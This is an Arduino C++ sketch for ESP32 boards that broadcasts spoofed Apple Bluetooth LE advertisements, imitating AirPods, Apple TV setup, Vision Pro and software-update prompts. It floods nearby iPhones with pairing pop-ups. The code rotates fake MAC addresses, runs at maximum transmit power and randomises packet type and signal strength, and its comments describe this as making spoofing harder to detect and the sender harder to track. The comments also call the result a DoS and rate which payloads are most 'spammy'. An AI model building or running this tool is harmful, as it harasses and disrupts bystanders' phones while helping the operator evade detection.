// This example takes heavy inpsiration from the ESP32 example by ronaldstoner
// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
// See the README for more info
#include <Arduino.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <Preferences.h>

#include <esp_arduino_version.h>

#include "devices.hpp"
#include "led.hpp"

// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 100;

int currentMode = 0;
Preferences preferences;

#define RIGHT_LED 12
#define LEFT_LED 13
const int BOOT_BUTTON_PIN = 9;
const unsigned long LONG_PRESS_TIME = 1000; // 1 seconds

void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  // Open "storage" namespace (false = read/write)
  preferences.begin("my-app", false);

  // Get the current mode, default to 0 if it doesn't exist
  currentMode = preferences.getInt("mode", 0);
  Serial.printf("Current Mode: %d\n", currentMode);
  preferences.end();

  // This is specific to the AirM2M ESP32 board
  // https://wiki.luatos.com/chips/esp32c3/board.html
  pinMode(RIGHT_LED, OUTPUT);
  pinMode(LEFT_LED, OUTPUT);
  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);
  
  BLEDevice::init("AirPods 69");

  // Increase the BLE Power to 21dBm (MAX)
  // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // seems we need to init it with an address in setup() step.
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void resetMode(){
  currentMode = 0;
  Serial.printf("Resetting mode to %d\n", currentMode);
  preferences.begin("my-app", false);
  preferences.putInt("mode", currentMode);
  preferences.end();
}

void nextMode(){
  currentMode = (currentMode + 1) % (sizeof(stateTable) / sizeof(stateTable[0]));
  Serial.printf("Updating mode to %d\n", currentMode);
  preferences.begin("my-app", false);
  preferences.putInt("mode", currentMode);
  preferences.end();
}

void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleDevice& dev) {
  uint8_t packet[31];
  size_t packetLen;
  generatePacket(dev, packet, packetLen);
  Serial.printf("Broadcasting %s (Length: %d)...\n", dev.name, packetLen);

  #ifdef ESP_ARDUINO_VERSION_MAJOR
    #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
        oAdvertisementData.addData(String((char*)packet, packetLen));
    #else
        oAdvertisementData.addData(std::string((char*)packet, packetLen));
    #endif
  #endif
}

void setRandomDeviceData(BLEAdvertisementData &oAdvertisementData) {
  // Randomly pick data from one of the devices
  int idx = random(0, sizeof(ALL_DEVICES) / sizeof(ALL_DEVICES[0]));
  AppleDevice dev = ALL_DEVICES[idx];
  setAdvertisementData(oAdvertisementData, dev);
}

bool shouldBeLitOn(LEDMode mode) {
  switch (mode) {
    case ON:    return true;
    case OFF:   return false;
    case FLASH: return true;
    default:    return false;
  }
}

bool shouldBeLitOff(LEDMode mode) {
  switch (mode) {
    case ON:    return false;
    case OFF:   return true;
    case FLASH: return true;
    default:    return false;
  }
}

void loop() {
  digitalWrite(LEFT_LED,  shouldBeLitOn(stateTable[currentMode][0])  ? HIGH : LOW);
  digitalWrite(RIGHT_LED, shouldBeLitOn(stateTable[currentMode][1]) ? HIGH : LOW);

  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
    unsigned long startTime = millis();
    while(digitalRead(BOOT_BUTTON_PIN) == LOW); 

    unsigned long pressDuration = millis() - startTime;
    if (pressDuration > LONG_PRESS_TIME) {
      Serial.println("BOOT button long pressed!");
      resetMode();
    } else {
      Serial.println("BOOT button short pressed!");
      nextMode();
    }
  }

  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  switch (currentMode){
    case LEFT_OFF_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS]); // This one seems the most spammy
      break;
    case LEFT_OFF_RIGHT_FLASH:
    setRandomDeviceData(oAdvertisementData);
      break;
    case LEFT_OFF_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[SOFTWARE_UPDATE]); // This is fairly spammy, not all phones
      break;
    case LEFT_FLASH_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS_GEN_2]); // TBD
      break;
    case LEFT_FLASH_RIGHT_FLASH:
    setAdvertisementData(oAdvertisementData, ALL_DEVICES[VISION_PRO]); // THis one affects very few devices, not as spammy (but kinda fun)
      break;
    case LEFT_FLASH_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS_MAX]); // TBD
      break;
    case LEFT_ON_RIGHT_OFF:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[APPLETV_SETUP]); // TBD
      break;
    case LEFT_ON_RIGHT_FLASH:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[TRANSFER_NUMBER]); // TBD
      break;
    case LEFT_ON_RIGHT_ON:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[APPLETV_PAIR]); // TBD
      break;
    default:
      setAdvertisementData(oAdvertisementData, ALL_DEVICES[HOMEPOD_SETUP]); // TBD
      break;
  }

  /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
      the three advertising PDU types when you want to connect to Apple devices.
          // 0 = ADV_TYPE_IND, 
          // 1 = ADV_TYPE_SCAN_IND
          // 2 = ADV_TYPE_NONCONN_IND
      
      Randomly using any of these PDU types may increase detectability of spoofed packets. 

      What we know for sure:
      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
  */
  
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // Set the device address, advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // Set advertising interval
  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
      
      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
  */

  //pAdvertising->setMinInterval(0x20);
  //pAdvertising->setMaxInterval(0x20);
  //pAdvertising->setMinPreferred(0x20);
  //pAdvertising->setMaxPreferred(0x20);

  // Start advertising
  pAdvertising->start();

  digitalWrite(LEFT_LED,  shouldBeLitOff(stateTable[currentMode][0]) ? LOW : HIGH);
  digitalWrite(RIGHT_LED, shouldBeLitOff(stateTable[currentMode][1]) ? LOW : HIGH);
  delay(delayMilliseconds); // delay for delayMilliseconds ms
  pAdvertising->stop();

  // Random signal strength increases the difficulty of tracking the signal
  int rand_val = random(100);  // Generate a random number between 0 and 99
  if (rand_val < 70) {  // 70% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  } else if (rand_val < 85) {  // 15% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
  } else if (rand_val < 95) {  // 10% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
  } else if (rand_val < 99) {  // 4% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
  } else {  // 1% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
  }
}
